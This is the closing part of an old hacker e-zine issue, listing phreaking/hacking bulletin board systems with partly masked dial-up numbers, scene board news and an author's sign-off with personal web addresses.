+  : ef-net.    o'btw; this is :   - -- ---------- -- -  : do I hack Internet" :
+  : NOT a busdrivers club!!!! :  remember; advertising  : We promise we will  :
+  :...........................:  in BHM is completely   : kick and ban you! if:
+                             :   free! send your adds 2 : you're on AOL we'll :
+                             :   rjack_@hotmail.com     : maybe even NUKE you :
+                             :   Subject: Suck me!      :.....................:
+                             :............................:
+
+
+.-==[NoShit! BBS'(HQ's and Dist Sites)]======================================-.
+|===[By: Codeblaster]=[BHM#4]=[02k]=[#20]=====================================|
+`-===========================================================================-'
+
+       __ ______             _________ _ _______      ______________ __
+       \_\\   _/_____________\_____  /_   __  _/______\_   _/  ____//_/
+         |    __    /   __  \    __  :|   /_    \    __   :|______    /
+         |    l/   /    \l   \   \l  .|    \     \   \l   .|    l/   /
+ .-------l____.---/___________\---.___|-----\_____\---.___slv---.___/---------.
+ |                                                                            |
+ | BoardName       | Status   |Nds.|Number            |System | Type          |
+ |=================|==========|====|==================|=======|===============|
+ | Once Innocent   | WHQ      | 02 | +47-563.110.97   | PCB   | Pure HPA      |
+ |                 |          |    | +47-563.XXX.XX   | X     | X             |
+ | Revelations     | USHQ     | 03 | +804-XX.XXX.XXX  |       |               |
+ |                 |          |    | +804-AS.K4I.T!!  |       |               |
+ |                 |          |    | +804-XX.XXX.XXX  |       |               |
+ | Midnight        | BrHQ     | 04 | +55-118.446.702  | PCB   | HPA           |
+ |                 |          |    | +55-NEW.NUMBER?  |       |               |
+ |                 |          |    | +55-NEW.NUMBER?  |       | * also telnet |
+ |                 |          |    | +55-NEW.NUMBER?  |       |               |
+ | SchizoFrenia    | SHQ      | 02 | +46-NOT-4LAMER   | X     | HPA           |
+ |                 |          |    | +46-GET-ITNOW!   |       |               |
+ | Dark Portal     | DIST     | 01 | +47-XXX.XXX.XX   | PCB   | SCENE/HPA     |
+ `============================================================================'
+
+ Recent boardnews: SchizoFrenia moved from DistSite to Swedish HQ, since The
+ Factory has been down way too long. Once Innocent is new WHQ, since Death
+ Wish and Zer0 Reality both closed down. Once Innocent is run by the same
+ people that ran DW and ZR though (Ripperjack & Codeblaster) ;) If you run a
+ hpa/elite board then we need more dist.sites/HQ's. No more norwegian boards
+ is accepted.
+
+
+.-==[That's it for this time folks! ;)]======================================-.
+|===[By: Codeblaster]=[BHM#4]=[01k]=[#21]=====================================|
+`-===========================================================================-'
+
+ Well, that's it for this time. Hmm, next time we'll strike harder (I hope),
+ cause this was a bit hurry-up release. Had to get it finished before the
+ deadline in mid-August. Well, anyways, until next time check out my site
+ at http://gudmund.vgs.no/~anepm/hpa/ ... we tried to set up a site at
+ roo.transient.net/~codeblast/ but that server seems like it's down all
+ the time. Later.
+
+                                                               - Codeblaster
